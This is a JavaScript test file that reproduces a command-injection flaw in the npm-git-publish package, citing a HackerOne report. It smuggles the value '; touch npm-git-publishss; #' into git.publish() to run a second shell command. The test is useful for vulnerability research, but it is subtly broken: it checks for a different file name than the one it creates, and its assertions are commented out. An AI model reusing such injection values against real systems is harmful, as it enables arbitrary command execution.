//https://hackerone.com/reports/730121
test("Remote code execution in npm-git-publish", () => {
  const git = require("npm-git-publish");
  const fs = require("fs");
  const path = "./npm-git-publish";

  //checking that its not present already
  file_exist = fs.existsSync(path);
  // expect(file_exist).toBe(false);

  // try {
  let x = git.publish(".", "; touch npm-git-publishss; #");
  x.then(() => {
    file_exist = fs.existsSync(path);
    // expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {}); //deleting the file after creation
  });
  // } catch (error) {}
});
